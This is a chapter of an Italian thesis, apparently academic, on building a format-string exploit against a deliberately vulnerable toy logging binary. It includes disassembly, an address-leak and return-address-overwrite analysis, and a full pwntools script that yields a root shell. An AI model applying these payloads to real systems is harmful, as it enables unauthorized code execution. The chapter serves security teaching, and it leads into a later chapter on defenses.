\chapter{Sviluppo pratico di un exploit}\label{chapter:exploit}
Finora abbiamo sempre avuto il codice sorgente a disposizione. Nel mondo reale però, molti servizi con cui è possibile interagire non mettono a disposizione né il codice sorgente né il file binario compilato. L'attaccante si trova quindi in uno scenario di tipo \emph{black-box}: non sa come sia scritto il programma, può solo fornirgli input e studiarne l'output o il comportamento.

Se però l'attaccante entra in possesso anche solo del binario, è possibile, tramite gli strumenti elencati nella Sottosezione~\ref{subsec:tools}, ottenere informazioni rilevanti tra cui: architettura, formato del file, impostazioni di sicurezza, disassemblato e decompilato (pseudocodice simile al linguaggio originale).

Tali informazioni rendono possibile ricostruire la logica del programma e individuarne le vulnerabilità: è esattamente ciò che tratta questo capitolo, insieme alla scrittura dello script Python che le sfrutta, applicando le tecniche del Capitolo~\ref{chapter:fmt_vuln}.


\section{Analisi del binario vulnerabile}\label{sec:vuln_service}
È necessario ottenere informazioni sul binario, di cui non sappiamo praticamente niente.
Il comando \texttt{file} permette di ricavare il formato del binario e la sua architettura (Codice~\ref{lst:file_output}) che sono rispettivamente ELF e x86-64 poiché il binario è stato compilato con GCC nell'ambiente di riferimento in Tabella~\ref{tab:ambiente_riferimento}.
\begin{lstlisting}[
    language={},
    numbers=none,
    gobble=4,
    caption={Estratto dell'output del comando \texttt{file} sul binario},
    label={lst:file_output}
]
    ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, [...], not stripped
\end{lstlisting}

Tipicamente i binari vengono compilati con l'opzione \texttt{-s} (\emph{strip}) che rimuove tutte le tabelle dei simboli e le informazioni di debug dal file eseguibile finale: oltre a ridurne le dimensioni, questo lo protegge rendendolo poco comprensibile. Per semplicità però, il binario in questo capitolo è stato compilato senza tale opzione. Vediamo infatti ``\texttt{not stripped}'' (Codice~\ref{lst:file_output}).

Un'altra informazione essenziale sono le impostazioni di sicurezza del binario che vengono ricavate dal comando \texttt{pwn checksec} (Codice~\ref{lst:checksec_output}).
\begin{lstlisting}[
    language={},
    numbers=none,
    gobble=4,
    caption={Output del comando \texttt{pwn checksec} sul binario},
    label={lst:checksec_output}
]
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
\end{lstlisting}
Tale configurazione è il default del compilatore GCC nel nostro ambiente (Tabella~\ref{tab:ambiente_riferimento}).

I comandi \texttt{file} e \texttt{pwn checksec} danno una prima idea del binario --- il tipo di disassemblato che si otterrà, le convenzioni in uso, le protezioni da affrontare --- ma nulla sulla logica del codice: per quella servono il disassemblato e il decompilato, entrambi ottenibili con \texttt{Ghidra}.

Il codice decompilato è un tentativo di ricostruire la logica e la struttura del programma originale esaminando il codice assembly (il disassemblato). Tale ricostruzione però è spesso confusionaria e va sistemata per rendere il codice più comprensibile (Codice~\ref{lst:ghidra_decompiled}).
\begin{lstlisting}[
    language=C,
    numbers=none,
    gobble=4,
    caption={Estratto del decompilato di \texttt{Ghidra} sistemato},
    label={lst:ghidra_decompiled}
]
    void debug_shell(void) {
        system("/bin/sh");
        return;
    }

    void log_message(char *msg) {
        printf(msg);
        return;
    }

    int main(void) {
        char buf[64];

        // ...
        puts("=== MiniLog v1.0 ===");
        while (fgets(buf, 64, stdin) != NULL) {
            log_message(buf);
        }
        // ...
        return 0;
    }
\end{lstlisting}
Il programma è una sorta di MiniLog che va a stampare in \texttt{stdout} tutto quello che viene scritto su \texttt{stdin}. Il problema sono le due funzioni \texttt{log\_message} e \texttt{debug\_shell}.

All'interno di \texttt{log\_message} è presente \texttt{printf(msg)} con \texttt{msg} controllata dall'utente e quindi vulnerabile.

La funzione \texttt{debug\_shell} apre una shell e, di per sé, non sarebbe un problema, poiché non viene mai chiamata da nessun punto del programma. In questo caso però, è pericolosa per la presenza della vulnerabilità format string che può dirottare il normale flusso d'esecuzione.

L'idea è di sfruttare la vulnerabilità format string andando a sovrascrivere il \emph{return address} (indirizzo di ritorno) di \texttt{log\_message} con l'indirizzo di \texttt{debug\_shell}: quando \texttt{log\_message} termina, l'esecuzione riprende da lì anziché da \texttt{main}, aprendo così una shell.
Per far ciò, è necessario conoscere sia l'indirizzo della funzione \texttt{debug\_shell} sia l'indirizzo dello stack dove è salvato il return address di \texttt{log\_message}.

Questi indirizzi però vengono randomizzati a causa di PIE (Codice~\ref{lst:checksec_output}) e ASLR, quest'ultima attiva di default a livello di sistema operativo, che complicano ma non rendono impossibile lo sfruttamento, soprattutto grazie alla presenza del ciclo \texttt{while}, che ci permette di iterare più volte sulla \texttt{printf} vulnerabile.

È infatti possibile calcolare l'indirizzo di \texttt{debug\_shell} a partire dal leak di un indirizzo dell'eseguibile e calcolare l'indirizzo dove è salvato il return address di \texttt{log\_message} a partire dal leak di un indirizzo dello stack. In una successiva iterazione (della stessa esecuzione) è poi possibile sovrascrivere tale return address con l'indirizzo di \texttt{debug\_shell} appena calcolato.\footnote{In realtà, il binario dichiara il supporto per \texttt{SHSTK} (Codice~\ref{lst:checksec_output}), una protezione pensata proprio contro questo tipo di dirottamento del return address. La sua attivazione a runtime, però, richiede anche il supporto della glibc in uso, presente solo a partire dalla versione 2.39 \cite{glibc2024}, successiva alla 2.35 dell'ambiente di riferimento (Tabella~\ref{tab:ambiente_riferimento}). Risulta perciò dichiarata ma non attiva.}


\section{Fase di leak: individuazione degli indirizzi utili}\label{sec:leak_phase}
Questa prima fase si occupa di scovare tutti gli indirizzi necessari alla conseguente scrittura del return address di \texttt{log\_message}: una scrittura che dirotta il flusso del programma.

\subsection{Leak dell'eseguibile: l'indirizzo di debug\_shell}\label{subsec:bin_leak}
Ogni binario viene caricato in memoria a partire da un indirizzo di \emph{base}: ogni suo elemento si trova a un offset fisso da questa base, lo stesso a ogni esecuzione anche quando la base cambia a causa di ASLR. Per trovare l'indirizzo di \texttt{debug\_shell} basta quindi il leak di un singolo indirizzo dell'eseguibile, da cui ricavare la base sottraendo l'offset noto del punto di leak, per poi risalire a qualunque altro elemento dell'eseguibile sommando il suo offset.

Troviamo un indirizzo del binario all'interno del return address --- salvato dalla chiamata a \texttt{log\_message} --- che punta all'istruzione successiva alla chiamata della funzione stessa dentro \texttt{main}. Tale return address viene depositato implicitamente sullo stack dalla chiamata a \texttt{log\_message} prima che la funzione venga eseguita.

Abbiamo già visto nel Capitolo~\ref{chapter:fmt_vuln} che possiamo fare il leak delle qword presenti nello stack, a partire dalla cima dello stack frame della funzione che chiama la \texttt{printf} vulnerabile. Di conseguenza, anche il return address di \texttt{log\_message} è raggiungibile tramite lo specificatore giusto, da individuare a partire dal suo disassemblato (Codice~\ref{lst:disas_log_message}).
\begin{lstlisting}[
    language={},
    numbers=none,
    gobble=4,
    caption={Estratto del disassemblato di \texttt{log\_message}},
    label={lst:disas_log_message}
]
    endbr64
    push   rbp
    mov    rbp,rsp
    sub    rsp,0x10
    
    ; ...

    call   printf@plt

    ; ...
\end{lstlisting}
Vengono allocati \texttt{0x10} byte (16 in decimale) per le variabili locali, e \texttt{rsp} non viene più toccato prima della chiamata a \texttt{printf}. Quindi lo stato dello stack frame di \texttt{log\_message} al momento della chiamata a \texttt{printf} è quello mostrato in Figura~\ref{fig:stack_log_message}.

Il return address è quindi la quarta qword a partire dalla cima dello stack, e lo specificatore corrispondente della format string è dunque il nono (cinque registri general-purpose più quattro qword dello stack). Trattandosi di un indirizzo, possiamo usare lo specificatore \texttt{\%p}: a differenza di \texttt{\%x}, \texttt{\%p} non richiede (né ammette) il modificatore \texttt{l}, poiché lo standard lo definisce univocamente per un argomento \texttt{void*}, la cui dimensione coincide già con quella di un puntatore sulla piattaforma corrente \cite{man3printf} (Codice~\ref{lst:leak_return_address}).
\begin{lstlisting}[
    language=Python,
    numbers=none,
    gobble=4,
    caption={Leak del return address di \texttt{log\_message}},
    label={lst:leak_return_address}
]
    # ...

    payload1 = b'%9$p'
    io.sendlineafter(b'=== MiniLog v1.0 ===\n', payload1)

    # ...
\end{lstlisting}

Restano da conoscere due soli valori per poter calcolare l'indirizzo di \texttt{debug\_shell}: l'offset del punto in cui abbiamo effettuato il leak e l'offset di \texttt{debug\_shell} stessa. Entrambi si ricavano dal disassemblato di \texttt{objdump} (Codice~\ref{lst:debug_shell_offset}), che per un binario con PIE mostra gli indirizzi delle istruzioni come offset rispetto alla base --- e non come indirizzi assoluti, come accadrebbe altrimenti.
\begin{lstlisting}[

    numbers=none,

]

    ; ...

        123f:	mov    rdx,QWORD PTR [rip+0x2dca]        # 4010 <stdin@GLIBC_2.2.5>

\end{lstlisting}
L'offset dell'indirizzo di cui abbiamo fatto il leak equivale a \texttt{0x123f}, mentre l'offset di \texttt{debug\_shell} vale \texttt{0x11c9}.

Il calcolo dell'indirizzo di \texttt{debug\_shell} è mostrato nel Codice~\ref{lst:debug_shell_address}, dove \texttt{binary\_addr} è l'indirizzo ottenuto dal leak del Codice~\ref{lst:leak_return_address}.

\subsection{Leak dello stack: la posizione del return address}\label{subsec:stack_leak}
Lo stack --- anch'esso randomizzato da ASLR --- viene caricato in una posizione differente dall'eseguibile, quindi il leak ricavato nella Sottosezione~\ref{subsec:bin_leak} non è utile. La sua struttura interna, però, resta identica a ogni esecuzione ed è ricavabile dal disassemblato del programma: come per l'indirizzo di \texttt{debug\_shell}, basta quindi il leak di un singolo indirizzo dello stack per risalire, tramite questa struttura nota, alla posizione del return address di \texttt{log\_message}.

Alla funzione \texttt{log\_message} viene passato un puntatore a \texttt{buf}, la variabile locale dichiarata in \texttt{main}: l'obiettivo del leak è proprio questo puntatore, che corrisponde a un indirizzo dello stack poiché \texttt{buf} è una variabile locale. Il disassemblato di \texttt{log\_message} (Codice~\ref{lst:disas_log_message}), nel tratto omesso subito dopo l'allocazione dello spazio per le variabili locali, salva questo puntatore con \texttt{mov QWORD PTR [rbp-0x8],rdi}: il puntatore occupa quindi la seconda delle due qword precedentemente lasciate vuote in Figura~\ref{fig:stack_log_message}, a partire da \texttt{rsp}.

Per calcolare la posizione del return address di \texttt{log\_message}, resta da conoscere la posizione di \texttt{buf} rispetto a tale return address. Questa si ricava dal disassemblato di \texttt{main} (Codice~\ref{lst:disas_main}).
\begin{lstlisting}[
    language={},
    numbers=none,
    gobble=4,
    caption={Estratto del disassemblato di \texttt{main}: allocazione dello stack e chiamata a \texttt{log\_message}},
    label={lst:disas_main}
]
    endbr64
    push   rbp
    mov    rbp,rsp
    sub    rsp,0x50

    ; ...

    lea    rax,[rbp-0x50]
    mov    rdi,rax
    call   log_message

    ; ...
\end{lstlisting}
\texttt{main} alloca \texttt{0x50} byte (80 in decimale) per le variabili locali e posiziona \texttt{buf} a \texttt{rbp-0x50}, in cima al proprio spazio --- cioè esattamente a \texttt{rsp} nel momento in cui chiama \texttt{log\_message}. La chiamata deposita il return address, che occupa quindi gli 8 byte immediatamente sopra l'inizio di \texttt{buf}, senza alcuno scarto. Perciò lo stato dello stack alla chiamata della \texttt{printf} vulnerabile è quello mostrato in Figura~\ref{fig:stack_ret_addr}.

\section{Fase di write: dagli indirizzi alla scrittura arbitraria}\label{sec:write_phase}
Rispetto alle scritture del Capitolo~\ref{chapter:fmt_vuln}, cambia la natura del valore da scrivere: non è noto a priori, ma viene calcolato a runtime dallo script dopo il leak di un indirizzo dell'eseguibile (Codice~\ref{lst:debug_shell_address}). Quindi anche il calcolo del payload, padding compreso, spetta allo script.

Poiché tale valore, in decimale, è enorme, non è possibile scriverlo con un'unica \texttt{\%ln}: come nella Sezione~\ref{sec:partial_write}, servirebbero più scritture parziali tramite \texttt{\%hn}, il cui numero e la cui posizione lo script dovrebbe stavolta calcolare a runtime anziché derivarli a mano.

\texttt{debug\_shell\_addr} permette però una scorciatoia che riduce tutto a una singola scrittura. Il suo offset (\texttt{0x11c9}) e l'offset del return address già presente sullo stack (\texttt{0x123f}, l'obiettivo della sovrascrittura) cadono nella stessa \emph{pagina} da \texttt{0x1000} byte del binario: divisi per \texttt{0x1000} danno lo stesso quoziente. Poiché la base scelta da ASLR è sempre allineata a una pagina, ovvero sempre multiplo di \texttt{0x1000}, sommandola a ciascuno dei due offset si ottengono due indirizzi che condividono tutti i bit tranne i 12 bit meno significativi, qualunque sia la base scelta. Il valore già presente all'indirizzo \texttt{ret\_pos\_addr} ha perciò già la parte alta corretta per diventare \texttt{debug\_shell\_addr}: resta da cambiare solo la parte bassa, che rientra comodamente in 2 byte. Basta dunque una singola scrittura con \texttt{\%hn}.

    \caption{Confronto fra \texttt{debug\_shell\_addr} e il return address in
    \texttt{ret\_pos\_addr}: stesso numero di pagina, offset di pagina diverso}
    \label{fig:addr_bitfield}
\end{figure} 

Scrivere \texttt{debug\_shell\_addr} così com'è, però, non basta: la scrittura riesce, ma l'esecuzione successiva termina con un crash (\texttt{SIGSEGV}).
La causa è l'allineamento dello stack richiesto dalla System V AMD64 ABI: subito prima di ogni chiamata, \texttt{rsp} deve essere un multiplo di 16 byte \cite{psabi2025}.

Quando ritorniamo all'indirizzo di \texttt{debug\_shell}, \texttt{rsp} è allineato a 16 byte, però l'istruzione \texttt{push rbp} lo disallinea. La chiamata a \texttt{system@plt} (Codice~\ref{lst:disas_debug_shell}) si ritrova così \texttt{rsp} disallineato di 8 byte e la \texttt{system()} di glibc non lo tollera.
Questo succede perché il prologo di \texttt{debug\_shell} si aspetta di essere raggiunto tramite un'istruzione \texttt{call}: il salvataggio del return address che essa compie disallinea lo stack di 8 byte, disallineamento poi corretto dal successivo salvataggio di \texttt{rbp}
\begin{lstlisting}[
    language={},
    numbers=none,
    gobble=4,
    caption={Estratto del disassemblato di \texttt{debug\_shell}},
    label={lst:disas_debug_shell}
]
    00000000000011c9 <debug_shell>:
        11c9:	endbr64
        11cd:	push   rbp
        11ce:	mov    rbp,rsp
        11d1:	lea    rax,[rip+0xe2c]
        11d8:	mov    rdi,rax
        11db:	call   10b0 <system@plt>
        
    ; ...
\end{lstlisting}

La correzione è saltare i primi 5 byte di \texttt{debug\_shell}, cioè \texttt{endbr64} e \texttt{push rbp} (causa del disallineamento): il valore da scrivere diventa quindi \texttt{debug\_shell\_addr + 5}. In questo modo nel momento della chiamata a \texttt{system()}, \texttt{rsp} è allineato a 16 byte, evitando così il \texttt{SIGSEGV}.

\texttt{debug\_shell\_addr + 5}, offset \texttt{0x11ce}, cade comunque nella stessa pagina di \texttt{0x11c9} e \texttt{0x123f}: il ragionamento visto sopra per la scrittura da 2 byte resta perciò valido senza modifiche: cambia solo il valore effettivamente scritto.

\texttt{buf} è la quinta qword a partire da \texttt{rsp} (Figura~\ref{fig:stack_ret_addr}) e corrisponde perciò al decimo specificatore della format string (cinque registri general-purpose più cinque qword dello stack). Il Codice~\ref{lst:write_payload} costruisce e invia il payload finale.
\begin{lstlisting}[
    language=Python,
    numbers=none,
    gobble=4,
    caption={Calcolo e scrittura di \texttt{debug\_shell\_addr + 5} in \texttt{ret\_pos\_addr}},
    label={lst:write_payload}
]
    # ...
 
    low16 = (debug_shell_addr + 5) & 0xffff
    spec = f'%{low16}x'.encode() \
            + b'%12$hn'
    pad = (-len(spec)) % 8
    payload3 = spec + b'\x00' * pad + p64(ret_pos_addr)
    io.sendline(payload3)

    # ...
\end{lstlisting}
Il payload è costituito da:
\begin{itemize}
    \item \texttt{f\textquotesingle\%\{low16\}x\textquotesingle}: stampa \texttt{low16} caratteri, impostando così il contatore di \texttt{printf} al valore da scrivere (i 16 bit bassi di \texttt{debug\_shell\_addr + 5});
    \item \texttt{b\textquotesingle\%12\$hn\textquotesingle}: scrive i 2 byte bassi del contatore all'indirizzo presente nel dodicesimo argomento fantasma. La posizione 12 non è casuale ed è la stessa a ogni esecuzione nonostante \texttt{low16} cambi: la lunghezza di \texttt{spec} varia fra 11 e 13 byte a seconda delle sue cifre (da due a cinque), ma il padding la riporta sempre a 16 byte, cioè due qword esatte. \texttt{spec} e il padding occupano dunque le prime due qword di \texttt{buf} (posizioni 10 e 11), e l'indirizzo finisce sempre in posizione 12;
    \item \texttt{pad}: numero dei byte di padding, calcolato a runtime in base alla lunghezza di \texttt{spec}, per allineare l'indirizzo che segue a 8 byte;
    \item \texttt{p64(ret\_pos\_addr)}: indirizzo impacchettato in \emph{little endian} su 64 bit, inserito per ultimo per lo stesso motivo della Sezione~\ref{sec:mem_write}: contenendo byte nulli, troncherebbe la lettura di \texttt{printf} se comparisse prima.
\end{itemize}

Una volta inviato il payload, la \texttt{printf} di \texttt{log\_message} termina normalmente, eseguendo la scrittura. Una volta arrivato all'istruzione \texttt{ret} però, l'esecuzione riprende da \texttt{debug\_shell} invece che da \texttt{main}, e si apre una shell. Resta da verificare che la shell così ottenuta sia davvero utilizzabile.


\section{Fase di verifica: dalla scrittura alla shell interattiva}\label{sec:verify_phase}
Finora abbiamo visto solo estratti di script Python. Il Codice~\ref{lst:full_exploit} riunisce per la prima volta tutti i frammenti costruiti separatamente nelle Sezioni~\ref{sec:leak_phase} e~\ref{sec:write_phase}, aggiungendo la parte rimasta finora implicita: l'apertura del processo e, una volta inviati tutti i payload, l'interazione vera e propria con la shell ottenuta. È infatti questa interazione a permetterci di verificare che l'exploit abbia davvero funzionato.
\begin{lstlisting}[
    language=Python,
    gobble=4,
    caption={Script completo dell'exploit},
    label={lst:full_exploit}
]
    from pwn import *

    exe = ELF('./vuln_service')
    context.binary = exe
    io = exe.process()

    payload1 = b'%9$p'
    io.sendlineafter(b'=== MiniLog v1.0 ===\n', payload1)
    binary_addr = int(io.recvline(), 16)
    base_addr = binary_addr - 0x123f
    debug_shell_addr = base_addr + 0x11c9

    payload2 = b'%7$p'
    io.sendline(payload2)
    buf_addr = int(io.recvline(), 16)
    ret_pos_addr = buf_addr - 8

    low16 = (debug_shell_addr + 5) & 0xffff
    spec = f'%{low16}x'.encode() \
            + b'%12$hn'
    pad = (-len(spec)) % 8
    payload3 = spec + b'\x00' * pad + p64(ret_pos_addr)
    io.sendline(payload3)

    io.recvrepeat(timeout=1)
    io.interactive()
\end{lstlisting}
Le prime righe hanno il compito di impostare il contesto di \texttt{pwntools} e di preparare il binario e il canale bidirezionale per comunicare con esso. L'istruzione \texttt{ELF(\textquotesingle./vuln\_service\textquotesingle)} carica il binario. \texttt{context.binary = exe} imposta poi il contesto globale di \texttt{pwntools} (architettura e ordine dei byte), che definisce il comportamento delle sue funzioni. L'istruzione \texttt{exe.process()} avvia infine il binario e restituisce il canale di comunicazione bidirezionale \texttt{io} già usato nelle sezioni precedenti, che permette allo script di interagire con il programma.

Le ultime due righe invece gestiscono la fase finale quando tutti i payload sono stati inviati. Usiamo \texttt{io.recvrepeat(timeout=1)} per scartare l'output di decine di migliaia di caratteri provocato dal \texttt{payload3} (Sezione~\ref{sec:write_phase}): altrimenti \texttt{io.interactive()} si attaccherebbe subito a \texttt{stdout}, stampando a schermo tutti quei caratteri. L'istruzione \texttt{io.interactive()} inoltra invece l'input del terminale al processo e ne restituisce a schermo l'output, permettendo di interagire con la shell ottenuta. Il Codice~\ref{lst:shell_proof} mostra l'output di un'esecuzione reale.
\begin{lstlisting}[
    language={},
    numbers=none,
    gobble=4,
    caption={Output di un'esecuzione reale dell'exploit},
    label={lst:shell_proof}
]
    [*] Switching to interactive mode
    $ id
    uid=0(root) gid=0(root) groups=0(root)
    $ echo "Hello, World!"
    Hello, World!
    $  
\end{lstlisting}
Abbiamo dunque ottenuto veramente una shell: l'exploit può dirsi concluso con successo.

Nessuna delle protezioni di sicurezza attive di default sul binario nell'ambiente di riferimento (Codice~\ref{lst:checksec_output}, Tabella~\ref{tab:ambiente_riferimento})  impedisce di causare leak di informazioni e di eseguire scritture in memoria.

Fermare questa vulnerabilità richiede protezioni pensate apposta contro la format string, non le protezioni generiche appena discusse. Il Capitolo~4 le presenta e ne verifica l'efficacia proprio sullo stesso exploit sviluppato in questo capitolo.
